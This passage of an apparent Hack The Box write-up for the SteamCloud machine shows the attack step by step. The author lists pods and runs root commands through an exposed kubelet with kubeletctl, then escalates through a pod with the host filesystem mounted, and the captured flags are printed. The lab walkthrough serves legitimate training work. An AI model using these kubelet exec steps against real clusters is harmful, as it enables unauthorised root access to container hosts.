+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-proxy&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:6120bd723dcedd08f7545da1a8458ad4f23fbd1e94cb578519122f920a77b737&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;coredns-78fcd69978-bzvqz&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;106f4483-d82e-4530-8cbd-f0a17d317764&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;coredns&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:8d147537fb7d1ac8895da4d55a5e53621949981e2e6460976dae812f83d84a44&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;etcd-steamcloud&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;967b9bee71f2e3cec06ff1dbde2a2a19&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;etcd&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:0048118155842e4c91f0498dd298b8e93dc3aecc7052d9882b76f48e311a76ba&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-apiserver-steamcloud&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;c1926d0465cd9de10197b95a2c359105&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-apiserver&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:53224b502ea4de7925ca5ed3d8a43dd4b500b2e8e4872bf9daea1fc3fec05edc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>To enhance readability, I will utilize <code>jq</code> to extract a list of <code>pod names</code> and their corresponding namespaces.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./kubeletctl_linux_amd64 runningpods -s 10.10.11.133 | jq -c <span style="color:#e6db74">&#39;.items[].metadata | [.name, .namespace]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;etcd-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;0xdf-pod&#34;</span>,<span style="color:#e6db74">&#34;default&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;nginx&#34;</span>,<span style="color:#e6db74">&#34;default&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;kube-proxy-nwx25&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;coredns-78fcd69978-bzvqz&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;kube-scheduler-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;storage-provisioner&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;kube-controller-manager-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;kube-apiserver-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Out of the list of pods obtained, only one pod exists outside the <code>kube-system</code> namespace.</p>
+<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I can execute the commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./kubeletctl_linux_amd64  -s 10.10.11.133 exec <span style="color:#e6db74">&#34;whoami&#34;</span> -p nginx -c nginx
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I take the <code>user flag</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ./kubeletctl_linux_amd64  -s 10.10.11.133 exec &#34;/bin/bash&#34; -p nginx -c nginx
+root@nginx:~# cd /root
+cd /root
+root@nginx:~# ls
+ls
+user.txt
+root@nginx:~# cat user.txt
+cat user.txt
+8c091afeac60fc28c7ad3a6763096529
+root@nginx:~# 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The approach I am  using involves creating a <code>pod</code> (container) with the <code>root file system</code> mapped into it, allowing you to <code>execute commands</code> within the pod and access the mapped volume, which represents the full file system of the host. I trying this with a pod named <code>0xdf-pod</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./kubeletctl_linux_amd64  exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span> -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
+</span></span><span style="display:flex;"><span>root@steamcloud:/# whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root@steamcloud:/# id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@steamcloud:/# find / -name root.txt 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -name root.txt 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/mnt/root/root.txt
+</span></span></code></pre></div><p>I take the <code>root flag</code>:</p>
+<pre tabindex="0"><code>root@steamcloud:/# cat /mnt/root/root.txt
+cat /mnt/root/root.txt
+6c3b4e5bdaab0b50d446f5f4ecfccd61
+root@steamcloud:/# 
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/active/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB Writeup - Active (Easy)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/beep/">
+                <span class="button__text">HTB Writeup - Beep (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
